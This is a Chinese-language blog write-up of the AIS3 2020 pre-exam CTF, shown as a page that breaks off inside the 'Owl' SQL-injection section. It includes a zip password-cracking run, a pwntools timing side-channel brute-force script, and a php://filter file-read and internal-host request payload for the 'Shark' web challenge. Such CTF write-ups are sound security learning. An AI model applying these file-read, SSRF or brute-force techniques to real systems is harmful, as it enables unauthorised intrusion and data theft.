@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>AIS3 2020 pre-exam & MyFirstCTF | CKB's Stash</title>
+  <meta name="description" content="前言第一次正式參加CTF！ 整體下來的感覺總而言之是非常的充實，在web方面看到了很多神奇的東西，學到很多，然而pwn跟reverse類基本上看不懂，discord上面的人都是神人啊 Q___Q只能說 Google真的是很好用XD">
+
+  <!-- evil icon -->
+
+  <link rel="stylesheet" href="/assets/evil-icons.min.css">
+  <script src="/assets/evil-icons.min.js"></script>
+
+  <!-- todo: include this into main.css -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+TC">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu+Mono">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="shortcut icon" type="image/png" href="/assets/favicon.png">
+  <link rel="canonical" href="http://chenkb91.github.io/writeup/2020/07/01/writeup.html">
+  <link rel="alternate" type="application/rss+xml" title="CKB's Stash" href="http://chenkb91.github.io/feed.xml">
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y072K5YWXX"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-Y072K5YWXX');
+</script>
+
+
+</head>
+
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+  <body>
+    <div class="page-content">
+      <div class="container">
+        <div class="three columns">
+          <header class="site-header">
+
+  <h2 class="logo"><a href="/">CKB's Stash</a></h2>
+  <div class="motto">Notes, blogs, random posts about random things </h4>
+  <div class="nav">
+    
+    <label for="menu-toggle" class="menu-icon">
+        <!-- <div data-icon="ei-navicon"></div> -->
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+    </label>
+    <input type="checkbox" id="menu-toggle">
+
+    <div class="site-nav">
+      <nav>
+        <ul class="page-link">
+          <li><a href="/">Home</a></li>
+          <li><a href="/archive">Archive</a></li>
+          <li><a href="/about">About</a></li>
+          <li><a href="/other">Other projects</a></li>
+          <li><a href="/feed.xml">RSS</a></li>
+        </ul>
+      </nav>
+    </div>
+
+  </div>
+</header>
+
+        </div>
+
+        <div class="nine columns" style="z-index:100;">
+          <div class="wrapper">
+            <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="article_header">
+    <h1 class="article_title" itemprop="name headline">AIS3 2020 pre-exam & MyFirstCTF</h1>
+    <p class="article_meta"><time datetime="2020-07-01T00:00:00+08:00" itemprop="datePublished">2020·7·1</time></p>
+  </header>
+
+  <div class="article-content" itemprop="articleBody">
+    <h2 id="前言">前言</h2>
+
+<p>第一次正式參加CTF！ 整體下來的感覺總而言之是非常的充實，在web方面看到了很多神奇的東西，學到很多，然而pwn跟reverse類基本上看不懂，discord上面的人都是神人啊 Q___Q</p>
+
+<p>只能說 Google真的是很好用XD
+<!--description-->
+<img src="/assets/scoreboard.png" style="zoom: 67%;" /></p>
+
+<p>官方Writeup:</p>
+<ul>
+  <li><a href="http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/">Reverse</a></li>
+  <li><a href="https://github.com/djosix/AIS3-2020-Pre-Exam">Web</a></li>
+  <li><a href="https://github.com/ss8651twtw/ais3-pre-exam-2020">Pwn</a></li>
+  <li><a href="https://github.com/frozenkp/CTF/tree/master/2020/AIS3_pre-exam">Misc</a></li>
+  <li><a href="https://maojui.me">Crypto</a></li>
+</ul>
+
+<h2 id="misc">Misc</h2>
+
+<hr />
+
+<h3 id="misc---piquero">Misc - piquero</h3>
+
+<p>一張圖片，盲人點字。</p>
+
+<p>直接上google圖片查對照表，拿張紙一個一個對，大寫字母和符號會多用一個點字來區別，蠻有趣的。</p>
+
+<p>Flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{I_feel_sleepy_Good_Night!!!}
+</code></pre></div></div>
+
+<h3 id="misc---soy">Misc - Soy</h3>
+
+<p>看到discord裡好多人都用手解，我在這裡真心表達佩服 XD</p>
+
+<p>我搜不到QRcode的演算法，倒是搜到了個工具XD</p>
+
+<p><a href="https://github.com/waidotto/strong-qr-decoder">https://github.com/waidotto/strong-qr-decoder</a></p>
+
+<p>把能看到的看不到的都餵給他：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat qrdata.txt
+xxxxxxx---xxx-xx--xxxxxxx
+x-----x--x-xx-xxx-x-----x
+x-xxx-x-x--x--xx--x-xxx-x
+x-xxx-x-----x---x-x-xxx-x
+x-xxx-x---xxx-----x-xxx-x
+x-----x--x-xxx-xx-x-----x
+xxxxxxx-x-x-x-x-x-xxxxxxx
+--------xxxx-xxxx--------
+????xxxxxx--xx---xx---x--
+????xx??x-------xxx--x---
+???x????x----x--x-xx-x-xx
+???????x-xx-xx-x--x-xx---
+????????x-xx-x----xxxx-x-
+???-x???-x---x----x--x-xx
+???-xxxx-xx------xxx-x---
+????----x--x-x-x-x-------
+?????xx??x--x--xxxxxxx--x
+--------x-x---x-x---xxxx-
+xxxxxxx-x----x-xx-x-xx-xx
+x-----x-xxx-xxx-x---x--x-
+x-xxx-x-x-xx-x--xxxxx-x-x
+x-xxx-x---x---------xxxxx
+x-xxx-x-xx---------xx-x-x
+x-----x-xxxxxxx---xx-x-x-
+xxxxxxx-x---xx-xx---xx-xx
+$ python qr.py qrdata.txt
+A�S3{H0w_c4nYy0u_f1nd_me?!?!?!!m
+</code></pre></div></div>
+
+<p>有點亂碼，不過正解flag是:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
+</code></pre></div></div>
+
+<h3 id="misc---karuego">Misc - Karuego</h3>
+
+<p>只給你一張檔案不知道在大什麼的圖片，上網稍微查了下圖片怎麼藏資料，幾乎全都是說把zip接在圖片後面？</p>
+
+<p>那就直接試著解壓縮：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>unzip Karuego.png
+Archive:  Karuego.png
+warning <span class="o">[</span>Karuego.png]:  2059568 extra bytes at beginning or within zipfile
+  <span class="o">(</span>attempting to process anyway<span class="o">)</span>
+<span class="o">[</span>Karuego.png] files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg password:
+</code></pre></div></div>
+
+<p>真的是，而且還有加密。先用<code class="language-plaintext highlighter-rouge">dd</code>把zip部份拿出來，再使用<code class="language-plaintext highlighter-rouge">fcrackzip</code>配合rockyou.txt去試密碼：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">dd </span><span class="nv">bs</span><span class="o">=</span>2059568 <span class="nv">skip</span><span class="o">=</span>1 <span class="k">if</span><span class="o">=</span>Karuego.png <span class="nv">of</span><span class="o">=</span>out.zip
+0+1 records <span class="k">in
+</span>0+1 records out
+1201353 bytes transferred <span class="k">in </span>0.004195 secs <span class="o">(</span>286379068 bytes/sec<span class="o">)</span>
+<span class="nv">$ </span>fcrackzip <span class="nt">-v</span> <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> rockyou.txt out.zip
+<span class="s1">'files/'</span> is not encrypted, skipping
+found file <span class="s1">'files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg'</span>, <span class="o">(</span>size <span class="nb">cp</span>/uc 113020/113110, flags 9, chk 216f<span class="o">)</span>
+found file <span class="s1">'files/Demon.png'</span>, <span class="o">(</span>size <span class="nb">cp</span>/uc 1087747/1092860, flags 9, chk 86e2<span class="o">)</span>
+checking pw luis99fer
+
+PASSWORD FOUND!!!!: pw <span class="o">==</span> lafire
+</code></pre></div></div>
+
+<p>解壓縮之後可以得到flag的圖片：</p>
+
+<p><img src="/assets/Demon.png" alt="Demon" /></p>
+
+<h3 id="misc---saburo">Misc - Saburo</h3>
+
+<p>連上去，伺服器提示<code class="language-plaintext highlighter-rouge">Flag:</code>讓你輸入，然後會跑出cpu時間，拿flag的開頭<code class="language-plaintext highlighter-rouge">AIS3{</code>去試，很明顯時間跟前面對了幾個字元直接相關，只是每個字元時間都會有不少誤差，要試多次取平均。</p>
+
+<p>直接上python：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'warning'</span>
+<span class="n">known</span> <span class="o">=</span> <span class="s">"AIS3{"</span> 
+
+<span class="n">chrs</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_}"</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">c</span><span class="o">=</span><span class="mi">0</span>
+    <span class="n">prev</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">st</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+    <span class="k">while</span> <span class="n">c</span><span class="o">&lt;</span><span class="nb">len</span><span class="p">(</span><span class="n">chrs</span><span class="p">):</span>
+        
+        <span class="n">avg</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s">'Trying </span><span class="si">{</span><span class="n">known</span><span class="o">+</span><span class="n">chrs</span><span class="p">[</span><span class="n">c</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"60.250.197.227"</span><span class="p">,</span> <span class="mi">11001</span><span class="p">)</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Flag: '</span><span class="p">)</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">known</span><span class="o">+</span><span class="n">chrs</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+            <span class="n">avg</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="o">-</span><span class="mi">14</span><span class="p">])</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+        <span class="n">avg</span> <span class="o">=</span> <span class="n">avg</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'  avg time=</span><span class="si">{</span><span class="n">avg</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">st</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">chrs</span><span class="p">[</span><span class="n">c</span><span class="p">]</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">avg</span><span class="si">}</span><span class="se">\n</span><span class="s">'</span>
+        <span class="n">flag</span><span class="o">=</span><span class="mi">0</span>
+        <span class="k">if</span> <span class="n">avg</span> <span class="o">&gt;</span> <span class="n">prev</span><span class="p">:</span>
+            <span class="n">flag</span><span class="o">=</span><span class="mi">1</span>
+            <span class="n">prev</span> <span class="o">=</span> <span class="n">avg</span>
+            <span class="n">largeind</span> <span class="o">=</span> <span class="n">c</span>
+        
+        <span class="n">c</span><span class="o">+=</span><span class="mi">1</span>
+        
+    <span class="k">print</span><span class="p">(</span><span class="n">st</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s">'largest char: </span><span class="si">{</span><span class="n">chrs</span><span class="p">[</span><span class="n">largeind</span><span class="p">]</span><span class="si">}</span><span class="s">, time=</span><span class="si">{</span><span class="n">prev</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">ans</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter char, or left empty to use largest: '</span><span class="p">)</span>
+    <span class="n">ans</span> <span class="o">=</span> <span class="n">ans</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ans</span><span class="o">==</span><span class="s">""</span><span class="p">:</span>
+        <span class="n">known</span> <span class="o">+=</span> <span class="n">chrs</span><span class="p">[</span><span class="n">largeind</span><span class="p">]</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s">'new char: [</span><span class="si">{</span><span class="n">chrs</span><span class="p">[</span><span class="n">largeind</span><span class="p">]</span><span class="si">}</span><span class="s">], time=</span><span class="si">{</span><span class="n">prev</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">known</span> <span class="o">+=</span> <span class="n">ans</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s">'new char: </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">known</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'}'</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>總之就是每個字元試15次，取最長的拿來試下一個。應該可以再用thread重寫優化，但是我懶的再跑一次，所以這裡我就不給flag了&gt;_&lt;</p>
+
+<h2 id="crypto">Crypto</h2>
+
+<hr />
+
+<h3 id="crypto---t-rex">Crypto - T-Rex</h3>
+
+<p>給了個文字檔案，是個排版的很漂亮的對照表，加上一大串字元，顯然是要一個一個對的Flag</p>
+
+<p>code直接寫下去就得到flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
+</code></pre></div></div>
+
+<p>這個暴龍很G8 &gt;_&lt;</p>
+
+<h3 id="crypto---brontosaurus">Crypto - Brontosaurus</h3>
+
+<p>題目提示：Brontosaurus peek at last year’s problems with a long neck and picked up “KcufsJ”.</p>
+
+<p>給了個一大串顯然是JSfuck的檔案。一開始我還沒看出那個KcufsJ是Jsfuck拼反，還去上網查:man_facepalming:</p>
+
+<p>所以就直接把整個東西反過來，丟到瀏覽器裡，會輸出flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{Br0n7Os4uru5_ch3at_3asi1Y}
+</code></pre></div></div>
+
+<h3 id="crypto---octopus">Crypto - Octopus</h3>
+
+<p>拿到的第一個100分以上的題目 可惜維基看太慢沒拿到首殺 &gt;_&lt;</p>
+
+<p>題目提到<a href="https://zh.wikipedia.org/wiki/量子密鑰分發">BB84 quantum key distribution</a>這東西（酷爆​​），給了一個Python程式和這個程式執行出來的結果。</p>
+
+<p>看懂維基百科之後就可以寫程式了，做出共同密鑰取前 400 個 bit 然後跟他給的 400 bit 作 XOR 就是flag了。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
+<span class="n">soriB</span> <span class="o">=</span> <span class="s">"'+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', ....（Basis）"</span>
+<span class="n">smyB</span> <span class="o">=</span> <span class="s">"'+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', ....（My Basis）"</span>
+<span class="n">sqb</span> <span class="o">=</span> <span class="s">"1j, 1j, (1+0j), (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), .... (Qubits)"</span>
+
+<span class="n">oriB</span> <span class="o">=</span> <span class="n">soriB</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">", "</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">oriB</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">oriB</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="n">oriB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">"'+'"</span><span class="p">:</span>
+        <span class="n">oriB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">oriB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">myB</span> <span class="o">=</span> <span class="n">smyB</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">", "</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">myB</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="n">myB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">"'+'"</span><span class="p">:</span>
+        <span class="n">myB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">myB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">qb</span> <span class="o">=</span> <span class="n">sqb</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">', '</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">qb</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'(1+0j)'</span><span class="p">:</span>
+        <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">'u'</span>
+    <span class="k">elif</span> <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1j'</span><span class="p">:</span>
+        <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">'r'</span>
+    <span class="k">elif</span> <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'(0.707+0.707j)'</span><span class="p">:</span>
+        <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">'ru'</span>
+    <span class="k">elif</span> <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'(0.707-0.707j)'</span><span class="p">:</span>
+        <span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">'rd'</span>
+
+
+<span class="k">def</span> <span class="nf">qb2bit</span><span class="p">(</span><span class="n">qb</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">qb</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'u'</span><span class="p">,</span><span class="s">'ru'</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">1</span>
+
+<span class="n">stream</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1024</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">oriB</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">myB</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+        <span class="n">stream</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">qb2bit</span><span class="p">(</span><span class="n">qb</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">'0b'</span> <span class="o">+</span> <span class="n">stream</span><span class="p">[:</span><span class="mi">400</span><span class="p">],</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="n">alter</span> <span class="o">=</span> <span class="mb">0b1101000110100011011100111001111001000011111101101101010010000111111001000100010111000111100101000101100101010111110001101110100100110110011100010010110000100000001000001010011010010011111001101001010000010010110000100110100111110001000110101100000111100010010010001110010100101000011100101100010110100101010110100100111001111101100110010000001010111010010101001110110001011001001110100110100011000100</span>
+<span class="k">print</span><span class="p">(</span><span class="n">alter</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">key</span> <span class="o">^</span> <span class="n">alter</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">flag</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="s">'0x'</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">'UTF-8'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>得到flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}
+</code></pre></div></div>
+
+<h2 id="web">Web</h2>
+
+<hr />
+
+<h3 id="web---shark">Web - Shark</h3>
+
+<p>提示說是去年的考古題，所以就直接拿來用wwww</p>
+
+<p>先用他給的path看index.php:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(\.|\/)/'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
+            <span class="c1">// disallow /path/like/this and ../this</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;[forbidden]&lt;/pre&gt;'</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">,</span> <span class="kc">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;pre&gt;'</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$content</span> <span class="o">?</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'[empty]'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="cp">?&gt;&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>🦈🦈🦈<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>🦈🦈🦈<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?path=hint.txt"</span><span class="nt">&gt;</span>Shark never cries?<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+
+</code></pre></div></div>
+
+<p>開頭不能是<code class="language-plaintext highlighter-rouge">/</code>和<code class="language-plaintext highlighter-rouge">.</code>，所以用php filter 繞過去，看/proc/net/fib_trie，看去年的writeup官方還給了<a href="http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421">這個網站</a>讓你找東西玩wwww</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/fib_trie
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Main:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.22.0.0/16 2 0 2
+        +-- 172.22.0.0/30 2 0 2
+           |-- 172.22.0.0
+              /32 link BROADCAST
+              /16 link UNICAST
+           |-- 172.22.0.3  &lt;--- 主機
+              /32 host LOCAL
+        |-- 172.22.255.255
+           /32 link BROADCAST
+Local:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+</code></pre></div></div>
+
+<p>看 /proc/net/arp 也行得通？</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IP address       HW type     Flags       HW address            Mask     Device
+172.22.0.11      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.14      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.17      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.20      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.1       0x1         0x2         02:42:c9:d4:ce:4b     *        eth0
+172.22.0.4       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.15      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.18      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.22.0.21      0x1         0x0         00:00:00:00:00
+</code></pre></div></div>
+
+<p>不知道，我太菜看不懂。但總之另外一個主機是在 172.22.0.2。</p>
+
+<p>直接<code class="language-plaintext highlighter-rouge">/?path=http://172.22.0.2/flag</code>就得到flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
+</code></pre></div></div>
+
+<h3 id="web---owl">Web - Owl</h3>
+
+<p>題目提示：1. 網頁裡有提示 2.這題根Crypto裡的turtle是混合題</p>
+
+<p>題目點進去是一個登入畫面，可以打帳號和密碼，網頁最上面可以反白看提示：「guess the stupid account/password」</p>
+
+<p>一開始我不知道這是什麼意思，所以我跑去看turtle那題，題目可以給個source參數看原始碼。</p>
+
+<p>直接瞎猜owl是否也能用同一招，結果還真的可以 XD</p>
+
+<p>拿到了原始碼，一看就知道是要玩SQL injection，然而他有做一些input過濾：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Get rid of sqlmap kiddies</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">],</span> <span class="s1">'sqlmap'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
